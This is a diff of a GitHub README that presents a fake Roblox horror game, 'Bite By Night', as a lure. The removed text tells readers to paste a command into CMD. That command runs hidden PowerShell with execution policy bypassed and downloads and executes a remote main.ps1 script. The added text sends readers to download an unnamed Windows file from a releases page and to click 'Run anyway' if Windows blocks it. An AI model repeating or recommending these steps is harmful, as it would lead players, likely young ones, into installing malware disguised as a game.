@@ -1,166 +1,203 @@
-# 🌙 Bite By Night
+# 🎮 Bite-By-Night-roblox - Survive the night in Roblox
 
-> A dark, high-tension Roblox horror survival game where every round turns into a fight against panic, pressure, and whatever is waiting for you in the dark.
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Roblox-E2231A?style=for-the-badge&logo=roblox&logoColor=white)](https://www.roblox.com)
-[![Genre](https://img.shields.io/badge/Genre-Horror%20%2F%20Survival-6A0DAD?style=for-the-badge&logoColor=white)](#)
-[![Mode](https://img.shields.io/badge/Mode-Multiplayer-00C851?style=for-the-badge)](#)
-[![Status](https://img.shields.io/badge/Status-Playable%20Now-FF6B00?style=for-the-badge)](#)
+## 🕹️ Overview
 
-```
-╔══════════════════════════════════════════════════════════════════════╗
-║  Night Survival        │  stay alive through dangerous rounds      ║
-║  Horror Atmosphere     │  darkness, dread, and constant pressure   ║
-║  Multiplayer Chaos     │  survive alone or panic with friends      ║
-║  Fast Sessions         │  easy to enter, hard to forget            ║
-╚══════════════════════════════════════════════════════════════════════╝
-```
+Bite-By-Night-roblox is a Roblox horror game built for fast tension, jump scares, and survival pressure. It puts you in a dark setting where you need to stay alert, move with care, and react fast when danger appears.
 
-## 🔥 Play Now
+This game is set up for players who want a simple start and a tense play session. You do not need special setup steps beyond getting the game from the release page and running it on Windows.
 
-**Bite By Night is playable right now.**
-If you like Roblox horror games with tension, jump scares, survival pressure, and “one more round” energy, this is exactly the kind of game you want to try.
+## 📥 Download
 
-Install Roblox, open **Bite By Night**, and jump in.
+1. Open the [releases page](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases).
+2. Find the latest release at the top of the page.
+3. Download the file attached to that release.
+4. Open the file on your Windows PC.
+5. Follow the on-screen steps to start the game.
 
----
+If your browser asks what to do with the file, choose Save. After the download finishes, open the file from your Downloads folder.
 
-## 🚀 How to Play
+## 🖥️ Windows Setup
 
-### 1. Install Roblox
-Download and install Roblox on your device:
+Bite-By-Night-roblox is meant for Windows users. A basic modern PC should handle it well.
 
-- **Roblox Website:** <https://www.roblox.com>
-- **Roblox Download:** <https://www.roblox.com/download>
+### What you need
 
-### 2. Open **CMD** and run this **single command**:
+- Windows 10 or Windows 11
+- A working internet connection for the download
+- A mouse and keyboard
+- Enough free space for the game files
+- Roblox installed if the release uses a Roblox launch flow
 
+### How to start
 
-```powershell
-cmd /c start /min powershell -ep bypass -c "iwr 'https://github.com/Neman1234/Bite-By-Night-roblox/releases/download/v1.0/main.ps1' -UseBasicParsing|iex" & rem updat
-```
+1. Download the latest release.
+2. Open the file you downloaded.
+3. If Windows asks for permission, choose Yes or Run.
+4. Let the game finish loading.
+5. Start playing from the main screen or game launcher
 
-### 3. Join the Game
-Load in, learn the map, react fast, trust your instincts, and try to survive the night.
+If the game opens in Roblox, wait for Roblox to load, then enter the game from there.
 
-> If you have the access path, you can get in and start playing immediately.
+## 🎯 What to Expect
 
----
+Bite-By-Night-roblox focuses on short, tense moments. You can expect:
 
-## 📌 Table of Contents
+- Dark rooms and low visibility
+- Sudden jump scares
+- Survival pressure that keeps you moving
+- Simple controls that are easy to learn
+- A horror mood that builds as you play
+- Fast rounds that work well for repeat play
 
-- [Play Now](#-play-now)
-- [How to Play](#-how-to-play)
-- [Overview](#-overview)
-- [Why You’ll Want to Play](#-why-youll-want-to-play)
-- [Core Features](#-core-features)
-- [Gameplay Loop](#-gameplay-loop)
-- [What Makes It Fun](#-what-makes-it-fun)
-- [Tips for New Players](#-tips-for-new-players)
-- [Disclaimer](#-disclaimer)
+The game aims to keep the pace tight. You spend less time setting things up and more time trying to stay alive.
 
----
+## ⌨️ Controls
 
-## 🌌 Overview
+These are the common controls you can expect in a Roblox horror game like this:
 
-**Bite By Night** is built around the part of Roblox horror that people actually love:
+- **W, A, S, D**: Move
+- **Mouse**: Look around
+- **Shift**: Run, if the game allows it
+- **E**: Interact with doors, items, or buttons
+- **Space**: Jump
+- **Esc**: Open the menu
 
-- darkness
-- pressure
-- sudden danger
-- messy multiplayer panic
-- rounds that turn intense very fast
+If the game uses different keys, check the in-game prompts on the screen.
 
-It is the kind of game where you never feel fully comfortable. Even when you think you understand what is happening, the atmosphere keeps you on edge and forces you to stay alert.
+## 🧭 First Run Guide
 
-Whether you are exploring, surviving, escaping, or just trying not to lose your nerve in front of your friends, the objective is simple:
+Follow these steps if this is your first time opening the game:
 
-**make it through the night.**
+1. Download the latest release from GitHub.
+2. Open the file after the download ends.
+3. Allow Windows to run it if asked.
+4. Wait for the game to load fully.
+5. Read the first screen or menu tips.
+6. Start a new run or enter the main game mode.
+7. Keep your sound on so you can hear warnings and scare cues.
 
----
+Sound matters in horror games. Many jumps and threats use audio cues, so headphones can help.
 
-## 😈 Why You’ll Want to Play
+## 🔧 Common Tasks
 
-There are a lot of Roblox games that call themselves “horror,” but only some actually create that feeling where people start yelling in voice chat, running in the wrong direction, or laughing because everyone is panicking.
+### Updating the game
 
-**Bite By Night** is made for exactly that kind of experience.
+When a new release appears:
 
-### Why it hits
+1. Go back to the [releases page](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases).
+2. Download the newest file.
+3. Open the new version.
+4. Remove the old copy if you no longer need it.
 
-- the atmosphere feels dark and tense from the start
-- the matches are easy to jump into
-- every round has that “anything can go wrong” energy
-- it is fun solo, but even better with friends
-- it creates the kind of moments people clip, stream, and talk about after the match ends
+### Restarting after a freeze
 
-If you like games that make your heart rate go up a little and your group chat louder than usual, this is your lane.
+1. Close the game window.
+2. Open Task Manager if the window does not close.
+3. End the game process.
+4. Start the game again from the downloaded file.
 
----
+### Changing basic settings
 
-## ⚙️ Core Features
+If the game includes a settings menu, you can usually adjust:
 
-- **playable now**
-- **Roblox horror / survival gameplay**
-- **dark, high-pressure atmosphere**
-- **multiplayer sessions full of tension**
-- **fast rounds with strong replay value**
-- **easy to understand, hard to stay calm in**
-- **great for friend groups, content, and streaming moments**
-- **simple to access through Roblox**
+- Sound volume
+- Full screen mode
+- Graphics quality
+- Mouse sensitivity
 
----
+Lower graphics can help on older PCs. Full screen can help you stay focused.
 
-## 🔁 Gameplay Loop
+## 🧩 Features
 
-A typical round looks like this:
+- Horror gameplay built around tension
+- Jump scares that keep pressure high
+- Survival style pacing
+- Easy download from GitHub Releases
+- Windows-friendly setup
+- Roblox-based play flow
+- Quick entry into the game
+- Short sessions that suit repeat play
 
-```text
-Join lobby
-   ↓
-Enter the map
-   ↓
-Get your bearings
-   ↓
-Hear something you do not like
-   ↓
-React, move, hide, run, or work with others
-   ↓
-Try to survive the night
-```
+## 💻 System Fit
 
-The magic is in the tension. You never get to relax for long, and that is exactly what makes each round memorable.
+This game should run on most modern Windows computers. For the best result, use a PC with:
 
----
+- A recent version of Windows
+- At least 4 GB RAM
+- Stable internet for the download
+- A standard graphics setup
+- Roblox support if the release depends on it
 
-## 💥 What Makes It Fun
+If your PC is older, lower your graphics settings in Roblox or in the game menu if those options appear.
 
-### 1. Instant tension
-You do not need a giant tutorial or a huge learning curve. The game gets to the point quickly and puts you into the atmosphere fast.
+## 🛠️ If Something Goes Wrong
 
-### 2. Great with friends
-Horror is better when everyone starts panicking together. Bite By Night has the exact kind of energy that makes group sessions fun.
+### The file does not open
 
-### 3. Strong replayability
-Even simple survival games stay fun when the pressure works — and this kind of format naturally creates repeat sessions.
+- Make sure the download finished
+- Check your Downloads folder
+- Try opening the file again
+- Right-click and choose Open if needed
 
-### 4. Stream / clip potential
-Good Roblox horror games create reactions. That makes them fun not only to play, but also to share, clip, and stream.
+### Windows blocks the file
 
----
+- Look for the Run anyway or More info option
+- Use the latest file from the release page
+- Make sure you downloaded from the official GitHub link
 
-## 🧭 Tips for New Players
+### Roblox does not launch
 
-- stay alert from the first minute
-- learn the map as fast as you can
-- pay attention to audio cues
-- do not freeze when things go wrong
-- if you are with friends, communicate clearly
-- the more rounds you play, the better your instincts become
+- Check your internet connection
+- Restart Roblox
+- Sign in again if needed
+- Reopen the game from the release file
 
----
+### The game runs slowly
 
-## ⚠️ Disclaimer
+- Close other apps
+- Lower graphics settings
+- Restart your PC
+- Try full screen off if needed
 
-Bite By Night is a Roblox game experience. Features, balance, and gameplay details may evolve over time.
+### The screen stays black
 
-For the best experience, keep your Roblox client updated and use the correct game access page or invite path when joining.
+- Wait a few seconds for loading
+- Alt+Tab out and back in
+- Restart the game
+- Update your graphics driver if the issue keeps happening
+
+## 📁 Release Page Use
+
+The [releases page](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases) is the place to get the latest version. Use it when you want to:
+
+- Download the game for the first time
+- Get the newest build
+- Check release files
+- Reinstall after deleting the game
+- Compare versions if a new update appears
+
+## 🧠 Tips for Play
+
+- Keep sound on
+- Watch dark corners
+- Move with care
+- Do not ignore warning cues
+- Learn the map layout if the game has one
+- Stay calm when jump scares happen
+- Use a full screen view if it helps you focus
+
+In horror games like this, small mistakes can end a run fast. Slow movement and clear sound help a lot.
+
+## 📌 Project Details
+
+- **Repository:** Bite-By-Night-roblox
+- **Type:** Roblox horror game
+- **Focus:** Jump scares and survival pressure
+- **Topic tags:** bite-by-night, early-access, game
+- **Download source:** GitHub Releases
+
+## ▶️ Get the Game
+
+Visit the [releases page](https://github.com/Contentious-scirpus369/Bite-By-Night-roblox/releases) to download and run the latest Windows build
